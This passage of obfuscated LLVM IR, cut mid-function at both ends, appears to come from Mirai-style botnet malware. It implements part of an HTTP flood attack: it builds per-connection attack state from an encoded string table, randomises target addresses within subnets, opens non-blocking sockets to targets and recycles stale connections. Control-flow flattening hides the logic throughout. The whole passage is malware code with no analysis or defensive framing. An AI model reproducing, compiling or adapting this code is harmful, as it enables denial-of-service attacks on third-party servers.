  %176 = load i8, i8* %5, align 1
  %177 = zext i8 %176 to i32
  %178 = srem i32 %175, %177
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %174, i64 %179
  %181 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i32 0, i32 1
  %182 = load i32, i32* %181, align 4
  %183 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %184 = load i32, i32* %9, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %183, i64 %185
  %187 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %186, i32 0, i32 4
  store i32 %182, i32* %187, align 4
  %188 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %189 = load i32, i32* %9, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %188, i64 %190
  %192 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %191, i32 0, i32 6
  %193 = getelementptr inbounds [257 x i8], [257 x i8]* %192, i32 0, i32 0
  %194 = load i8*, i8** %17, align 8
  %195 = call i32 @util_strcpy(i8* %193, i8* %194)
  %196 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %199, i32 0, i32 6
  %201 = getelementptr inbounds [257 x i8], [257 x i8]* %200, i64 0, i64 0
  %202 = load i8, i8* %201, align 4
  %203 = sext i8 %202 to i32
  %204 = icmp ne i32 %203, 47
  %205 = select i1 %204, i32 -1466966896, i32 -1893131949
  store i32 %205, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %208 = load i32, i32* %9, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %207, i64 %209
  %211 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %210, i32 0, i32 6
  %212 = getelementptr inbounds [257 x i8], [257 x i8]* %211, i32 0, i32 0
  %213 = getelementptr inbounds i8, i8* %212, i64 1
  %214 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %215 = load i32, i32* %9, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %217, i32 0, i32 6
  %219 = getelementptr inbounds [257 x i8], [257 x i8]* %218, i32 0, i32 0
  %220 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %221 = load i32, i32* %9, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %220, i64 %222
  %224 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %223, i32 0, i32 6
  %225 = getelementptr inbounds [257 x i8], [257 x i8]* %224, i32 0, i32 0
  %226 = call i32 @util_strlen(i8* %225)
  %227 = sext i32 %226 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %213, i8* %219, i64 %227, i32 1, i1 false)
  %228 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %229 = load i32, i32* %9, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %228, i64 %230
  %232 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %231, i32 0, i32 6
  %233 = getelementptr inbounds [257 x i8], [257 x i8]* %232, i64 0, i64 0
  store i8 47, i8* %233, align 4
  store i32 -1893131949, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %236 = load i32, i32* %9, align 4
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %235, i64 %237
  %239 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %238, i32 0, i32 10
  %240 = getelementptr inbounds [9 x i8], [9 x i8]* %239, i32 0, i32 0
  %241 = load i8*, i8** %15, align 8
  %242 = call i32 @util_strcpy(i8* %240, i8* %241)
  %243 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %244 = load i32, i32* %9, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %243, i64 %245
  %247 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %246, i32 0, i32 9
  %248 = getelementptr inbounds [9 x i8], [9 x i8]* %247, i32 0, i32 0
  %249 = load i8*, i8** %15, align 8
  %250 = call i32 @util_strcpy(i8* %248, i8* %249)
  %251 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %252 = load i32, i32* %9, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %251, i64 %253
  %255 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %254, i32 0, i32 7
  %256 = getelementptr inbounds [129 x i8], [129 x i8]* %255, i32 0, i32 0
  %257 = load i8*, i8** %16, align 8
  %258 = call i32 @util_strcpy(i8* %256, i8* %257)
  %259 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %260 = load i32, i32* %9, align 4
  %261 = load i8, i8* %5, align 1
  %262 = zext i8 %261 to i32
  %263 = srem i32 %260, %262
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %259, i64 %264
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %265, i32 0, i32 2
  %267 = load i8, i8* %266, align 4
  %268 = zext i8 %267 to i32
  %269 = icmp slt i32 %268, 32
  %270 = select i1 %269, i32 285700029, i32 -1826854186
  store i32 %270, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %273 = load i32, i32* %9, align 4
  %274 = load i8, i8* %5, align 1
  %275 = zext i8 %274 to i32
  %276 = srem i32 %273, %275
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %272, i64 %277
  %279 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %278, i32 0, i32 1
  %280 = load i32, i32* %279, align 4
  %281 = call i32 @ntohl(i32 %280) #7
  %282 = call i32 @rand_next()
  %283 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %284 = load i32, i32* %9, align 4
  %285 = load i8, i8* %5, align 1
  %286 = zext i8 %285 to i32
  %287 = srem i32 %284, %286
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %283, i64 %288
  %290 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %289, i32 0, i32 2
  %291 = load i8, i8* %290, align 4
  %292 = zext i8 %291 to i32
  %293 = lshr i32 %282, %292
  %294 = add i32 %281, %293
  %295 = call i32 @htonl(i32 %294) #7
  %296 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %297 = load i32, i32* %9, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %296, i64 %298
  %300 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %299, i32 0, i32 4
  store i32 %295, i32* %300, align 4
  store i32 -1826854186, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  %302 = call i32 @rand_next()
  %303 = urem i32 %302, 5
  store i32 %303, i32* %.reg2mem10
  store i32 1419489459, i32* %switchVar
  br label %loopEnd

NodeBlock7:                                       ; preds = %loopEntry
  %.reload16 = load volatile i32, i32* %.reg2mem10
  %Pivot8 = icmp slt i32 %.reload16, 2
  %304 = select i1 %Pivot8, i32 -1929668605, i32 1784243764
  store i32 %304, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload13 = load volatile i32, i32* %.reg2mem10
  %Pivot6 = icmp slt i32 %.reload13, 3
  %305 = select i1 %Pivot6, i32 -1708280499, i32 -1072684276
  store i32 %305, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload12 = load volatile i32, i32* %.reg2mem10
  %Pivot4 = icmp slt i32 %.reload12, 4
  %306 = select i1 %Pivot4, i32 -166429748, i32 -810902112
  store i32 %306, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem10
  %SwitchLeaf2 = icmp eq i32 %.reload11, 4
  %307 = select i1 %SwitchLeaf2, i32 -440448056, i32 956623711
  store i32 %307, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload15 = load volatile i32, i32* %.reg2mem10
  %Pivot = icmp slt i32 %.reload15, 1
  %308 = select i1 %Pivot, i32 -1287013769, i32 -1785738241
  store i32 %308, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload14 = load volatile i32, i32* %.reg2mem10
  %SwitchLeaf = icmp eq i32 %.reload14, 0
  %309 = select i1 %SwitchLeaf, i32 1133628317, i32 956623711
  store i32 %309, i32* %switchVar
  br label %loopEnd

; <label>:310:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 54)
  %311 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %314, i32 0, i32 5
  %316 = getelementptr inbounds [512 x i8], [512 x i8]* %315, i32 0, i32 0
  %317 = call i8* @table_retrieve_val(i32 54, i32* null)
  %318 = call i32 @util_strcpy(i8* %316, i8* %317)
  call void @table_lock_val(i8 zeroext 54)
  store i32 1240972321, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 55)
  %320 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %323, i32 0, i32 5
  %325 = getelementptr inbounds [512 x i8], [512 x i8]* %324, i32 0, i32 0
  %326 = call i8* @table_retrieve_val(i32 55, i32* null)
  %327 = call i32 @util_strcpy(i8* %325, i8* %326)
  call void @table_lock_val(i8 zeroext 55)
  store i32 1240972321, i32* %switchVar
  br label %loopEnd

; <label>:328:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 56)
  %329 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %332, i32 0, i32 5
  %334 = getelementptr inbounds [512 x i8], [512 x i8]* %333, i32 0, i32 0
  %335 = call i8* @table_retrieve_val(i32 56, i32* null)
  %336 = call i32 @util_strcpy(i8* %334, i8* %335)
  call void @table_lock_val(i8 zeroext 56)
  store i32 1240972321, i32* %switchVar
  br label %loopEnd

; <label>:337:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 57)
  %338 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %339 = load i32, i32* %9, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %338, i64 %340
  %342 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %341, i32 0, i32 5
  %343 = getelementptr inbounds [512 x i8], [512 x i8]* %342, i32 0, i32 0
  %344 = call i8* @table_retrieve_val(i32 57, i32* null)
  %345 = call i32 @util_strcpy(i8* %343, i8* %344)
  call void @table_lock_val(i8 zeroext 57)
  store i32 1240972321, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 58)
  %347 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %348 = load i32, i32* %9, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %347, i64 %349
  %351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %350, i32 0, i32 5
  %352 = getelementptr inbounds [512 x i8], [512 x i8]* %351, i32 0, i32 0
  %353 = call i8* @table_retrieve_val(i32 58, i32* null)
  %354 = call i32 @util_strcpy(i8* %352, i8* %353)
  call void @table_lock_val(i8 zeroext 58)
  store i32 1240972321, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 1240972321, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %357 = load i32, i32* %9, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %356, i64 %358
  %360 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %359, i32 0, i32 6
  %361 = getelementptr inbounds [257 x i8], [257 x i8]* %360, i32 0, i32 0
  %362 = load i8*, i8** %17, align 8
  %363 = call i32 @util_strcpy(i8* %361, i8* %362)
  store i32 -1814801327, i32* %switchVar
  br label %loopEnd

; <label>:364:                                    ; preds = %loopEntry
  %365 = load i32, i32* %9, align 4
  %366 = add nsw i32 %365, 1
  store i32 %366, i32* %9, align 4
  store i32 1374903555, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  store i32 127342235, i32* %switchVar
  br label %loopEnd

; <label>:368:                                    ; preds = %loopEntry
  store i32 0, i32* %23, align 4
  %369 = call i64 @time(i64* null) #6
  %370 = trunc i64 %369 to i32
  store i32 %370, i32* %27, align 4
  store i32 1614646283, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %373 = getelementptr inbounds [16 x i64], [16 x i64]* %372, i64 0, i64 0
  %374 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %373) #6, !srcloc !1
  %375 = extractvalue { i64, i64* } %374, 0
  %376 = extractvalue { i64, i64* } %374, 1
  %377 = trunc i64 %375 to i32
  store i32 %377, i32* %28, align 4
  %378 = ptrtoint i64* %376 to i64
  %379 = trunc i64 %378 to i32
  store i32 %379, i32* %29, align 4
  store i32 1966028553, i32* %switchVar
  br label %loopEnd

; <label>:380:                                    ; preds = %loopEntry
  store i32 493471845, i32* %switchVar
  br label %loopEnd

; <label>:381:                                    ; preds = %loopEntry
  %382 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %383 = getelementptr inbounds [16 x i64], [16 x i64]* %382, i64 0, i64 0
  %384 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %383) #6, !srcloc !2
  %385 = extractvalue { i64, i64* } %384, 0
  %386 = extractvalue { i64, i64* } %384, 1
  %387 = trunc i64 %385 to i32
  store i32 %387, i32* %30, align 4
  %388 = ptrtoint i64* %386 to i64
  %389 = trunc i64 %388 to i32
  store i32 %389, i32* %31, align 4
  store i32 -1401533593, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1089897759, i32* %switchVar
  br label %loopEnd

; <label>:391:                                    ; preds = %loopEntry
  %392 = load i32, i32* %9, align 4
  %393 = load i32, i32* %18, align 4
  %394 = icmp slt i32 %392, %393
  %395 = select i1 %394, i32 1572601886, i32 -283384343
  store i32 %395, i32* %switchVar
  br label %loopEnd

; <label>:396:                                    ; preds = %loopEntry
  %397 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %398 = load i32, i32* %9, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %397, i64 %399
  store %struct.attack_http_state* %400, %struct.attack_http_state** %26, align 8
  %401 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %402 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %401, i32 0, i32 1
  %403 = load i8, i8* %402, align 4
  %404 = zext i8 %403 to i32
  %405 = icmp eq i32 %404, 1
  %406 = select i1 %405, i32 -811149537, i32 609313212
  store i32 %406, i32* %switchVar
  br label %loopEnd

; <label>:407:                                    ; preds = %loopEntry
  %408 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %409 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %408, i32 0, i32 12
  %410 = load i32, i32* %409, align 4
  %411 = icmp ne i32 %410, 0
  %412 = select i1 %411, i32 -746486378, i32 -813063586
  store i32 %412, i32* %switchVar
  br label %loopEnd

; <label>:413:                                    ; preds = %loopEntry
  %414 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %415 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %414, i32 0, i32 1
  store i8 4, i8* %415, align 4
  store i32 -2009967126, i32* %switchVar
  br label %loopEnd

; <label>:416:                                    ; preds = %loopEntry
  %417 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %418 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %417, i32 0, i32 1
  store i8 0, i8* %418, align 4
  store i32 -2009967126, i32* %switchVar
  br label %loopEnd

; <label>:419:                                    ; preds = %loopEntry
  store i32 609313212, i32* %switchVar
  br label %loopEnd

; <label>:420:                                    ; preds = %loopEntry
  %421 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %421, i32 0, i32 1
  %423 = load i8, i8* %422, align 4
  %424 = zext i8 %423 to i32
  %425 = icmp eq i32 %424, 0
  %426 = select i1 %425, i32 -1104362461, i32 1696927156
  store i32 %426, i32* %switchVar
  br label %loopEnd

; <label>:427:                                    ; preds = %loopEntry
  %428 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %428, i8 0, i64 16, i32 4, i1 false)
  %429 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %430 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %429, i32 0, i32 0
  %431 = load i32, i32* %430, align 4
  %432 = icmp ne i32 %431, -1
  %433 = select i1 %432, i32 1876311885, i32 -77874010
  store i32 %433, i32* %switchVar
  br label %loopEnd

; <label>:434:                                    ; preds = %loopEntry
  %435 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %436 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %435, i32 0, i32 0
  %437 = load i32, i32* %436, align 4
  %438 = call i32 @close(i32 %437)
  store i32 -77874010, i32* %switchVar
  br label %loopEnd

; <label>:439:                                    ; preds = %loopEntry
  %440 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %441 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %442 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %441, i32 0, i32 0
  store i32 %440, i32* %442, align 4
  %443 = icmp eq i32 %440, -1
  %444 = select i1 %443, i32 -547188382, i32 -48285682
  store i32 %444, i32* %switchVar
  br label %loopEnd

; <label>:445:                                    ; preds = %loopEntry
  store i32 1203471678, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  %447 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %448 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %447, i32 0, i32 0
  %449 = load i32, i32* %448, align 4
  %450 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %451 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %450, i32 0, i32 0
  %452 = load i32, i32* %451, align 4
  %453 = call i32 (i32, i32, ...) @fcntl(i32 %452, i32 3, i32 0)
  %454 = or i32 2048, %453
  %455 = call i32 (i32, i32, ...) @fcntl(i32 %449, i32 4, i32 %454)
  store i32 65535, i32* %10, align 4
  %456 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %457 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %456, i32 0, i32 0
  %458 = load i32, i32* %457, align 4
  %459 = bitcast i32* %10 to i8*
  %460 = call i32 @setsockopt(i32 %458, i32 0, i32 8, i8* %459, i32 4) #6
  %461 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %461, align 4
  %462 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %463 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %462, i32 0, i32 4
  %464 = load i32, i32* %463, align 4
  %465 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %466 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %465, i32 0, i32 0
  store i32 %464, i32* %466, align 4
  %467 = load i16, i16* %19, align 2
  %468 = call zeroext i16 @htons(i16 zeroext %467) #7
  %469 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %468, i16* %469, align 2
  %470 = load i32, i32* %27, align 4
  %471 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %472 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %471, i32 0, i32 2
  store i32 %470, i32* %472, align 4
  %473 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %474 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %473, i32 0, i32 1
  store i8 2, i8* %474, align 4
  %475 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %476 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %475, i32 0, i32 0
  %477 = load i32, i32* %476, align 4
  %478 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %479 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %479, %struct.sockaddr** %478, align 8
  %480 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %481 = load %struct.sockaddr*, %struct.sockaddr** %480, align 8
  %482 = call i32 @connect(i32 %477, %struct.sockaddr* %481, i32 16)
  %483 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %484 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %483, i32 0, i32 0
  %485 = load i32, i32* %484, align 4
  %486 = srem i32 %485, 64
  %487 = zext i32 %486 to i64
  %488 = shl i64 1, %487
  %489 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %490 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %491 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %490, i32 0, i32 0
  %492 = load i32, i32* %491, align 4
  %493 = sdiv i32 %492, 64
  %494 = sext i32 %493 to i64
  %495 = getelementptr inbounds [16 x i64], [16 x i64]* %489, i64 0, i64 %494
  %496 = load i64, i64* %495, align 8
  %497 = or i64 %496, %488
  store i64 %497, i64* %495, align 8
  %498 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %499 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %498, i32 0, i32 0
  %500 = load i32, i32* %499, align 4
  %501 = load i32, i32* %23, align 4
  %502 = icmp sgt i32 %500, %501
  %503 = select i1 %502, i32 -1373722447, i32 -470757365
  store i32 %503, i32* %switchVar
  br label %loopEnd

; <label>:504:                                    ; preds = %loopEntry
  %505 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %506 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %505, i32 0, i32 0
  %507 = load i32, i32* %506, align 4
  %508 = add nsw i32 %507, 1
  store i32 %508, i32* %23, align 4
  store i32 -470757365, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  store i32 -1089755431, i32* %switchVar
  br label %loopEnd

; <label>:510:                                    ; preds = %loopEntry
  %511 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %512 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %511, i32 0, i32 1
  %513 = load i8, i8* %512, align 4
  %514 = zext i8 %513 to i32
  %515 = icmp eq i32 %514, 2
  %516 = select i1 %515, i32 -749407995, i32 1610600802
  store i32 %516, i32* %switchVar
  br label %loopEnd

; <label>:517:                                    ; preds = %loopEntry
  %518 = load i32, i32* %27, align 4
  %519 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %520 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %519, i32 0, i32 2
  %521 = load i32, i32* %520, align 4
  %522 = sub i32 %518, %521
  %523 = icmp ugt i32 %522, 30
  %524 = select i1 %523, i32 -1271129881, i32 -958719833
  store i32 %524, i32* %switchVar
  br label %loopEnd

; <label>:525:                                    ; preds = %loopEntry
  %526 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %527 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %526, i32 0, i32 1
  store i8 0, i8* %527, align 4
  %528 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %529 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %528, i32 0, i32 0
  %530 = load i32, i32* %529, align 4
  %531 = call i32 @close(i32 %530)
  %532 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %533 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %532, i32 0, i32 0
  store i32 -1, i32* %533, align 4
  store i32 1203471678, i32* %switchVar
  br label %loopEnd

; <label>:534:                                    ; preds = %loopEntry
  %535 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %536 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %535, i32 0, i32 0
  %537 = load i32, i32* %536, align 4
  %538 = srem i32 %537, 64
  %539 = zext i32 %538 to i64
  %540 = shl i64 1, %539
  %541 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %542 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %543 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %542, i32 0, i32 0
  %544 = load i32, i32* %543, align 4
  %545 = sdiv i32 %544, 64
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds [16 x i64], [16 x i64]* %541, i64 0, i64 %546
  %548 = load i64, i64* %547, align 8
  %549 = or i64 %548, %540
  store i64 %549, i64* %547, align 8
  %550 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %551 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %550, i32 0, i32 0
  %552 = load i32, i32* %551, align 4
  %553 = load i32, i32* %23, align 4
  %554 = icmp sgt i32 %552, %553
  %555 = select i1 %554, i32 279785421, i32 -1456737321
  store i32 %555, i32* %switchVar
  br label %loopEnd

; <label>:556:                                    ; preds = %loopEntry
  %557 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %558 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %557, i32 0, i32 0
  %559 = load i32, i32* %558, align 4
  %560 = add nsw i32 %559, 1
  store i32 %560, i32* %23, align 4
  store i32 -1456737321, i32* %switchVar
  br label %loopEnd

; <label>:561:                                    ; preds = %loopEntry
  store i32 -1679670361, i32* %switchVar
  br label %loopEnd

; <label>:562:                                    ; preds = %loopEntry
  %563 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %564 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %563, i32 0, i32 1
  %565 = load i8, i8* %564, align 4
  %566 = zext i8 %565 to i32
  %567 = icmp eq i32 %566, 4
  %568 = select i1 %567, i32 1673182456, i32 -660752780
  store i32 %568, i32* %switchVar
  br label %loopEnd

; <label>:569:                                    ; preds = %loopEntry
  %570 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %571 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %570, i32 0, i32 14
  store i32 -1, i32* %571, align 4
  %572 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %573 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %572, i32 0, i32 11
  store i32 0, i32* %573, align 4
  %574 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %575 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %574, i32 0, i32 18
  %576 = getelementptr inbounds [1024 x i8], [1024 x i8]* %575, i32 0, i32 0
  call void @util_zero(i8* %576, i32 1024)
  %577 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %578 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %577, i32 0, i32 17
  store i32 0, i32* %578, align 4
  %579 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
